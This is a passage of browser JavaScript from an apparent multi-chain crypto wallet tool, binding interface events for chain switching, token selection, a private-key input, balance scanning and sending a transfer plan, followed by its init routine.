    state.debug.failures = [];
    state.selectedTokenAddresses = [];
    if (state.account) {
      await switchChain();
      if (localVersion !== state.scanVersion) {
        return;
      }
      restoreScanCache();
    } else {
      renderDebugPanel();
    }
  });

  el.executionStrategy.addEventListener("change", updateStrategyStatus);
  el.tokenSelectionMode.addEventListener("change", () => {
    const mode = el.tokenSelectionMode.value;
    renderTokenTransferList();
    setTransferNotice("Token selection mode: " + mode + ".");
  });
  el.tokenTransferList.addEventListener("change", (event) => {
    const target = event.target;
    if (!(target instanceof HTMLInputElement)) {
      return;
    }
    if (!target.classList.contains("token-transfer-checkbox")) {
      return;
    }
    const address = (target.dataset.address || "").toLowerCase();
    if (!address) {
      return;
    }
    if (target.checked) {
      if (!state.selectedTokenAddresses.includes(address)) {
        state.selectedTokenAddresses.push(address);
      }
    } else {
      state.selectedTokenAddresses = state.selectedTokenAddresses.filter((item) => item !== address);
    }
  });
  el.debugToggle.addEventListener("change", renderDebugPanel);
  el.privateKeyInput.addEventListener("input", async () => {
    updateSigningModeDisplay();
    if (state.browserProvider && state.account) {
      await refreshWalletStatus();
      restoreScanCache();
    }
  });
  el.connectButton.addEventListener("click", connectWallet);
  el.scanBalancesButton.addEventListener("click", loadKnownTokenBalances);
  el.sendButton.addEventListener("click", sendSelectedPlan);
}

async function init() {
  await loadEnrichedTokenCatalog();
  await loadChainlistRpcs();
  populateChains();
  updateStrategyStatus();
  state.debug.configuredTokenCount = getChainKnownTokensFromCatalog().length;
  renderTokenTransferList();
  renderDebugPanel();
  bindEvents();
  bindWalletEvents();
}

init();
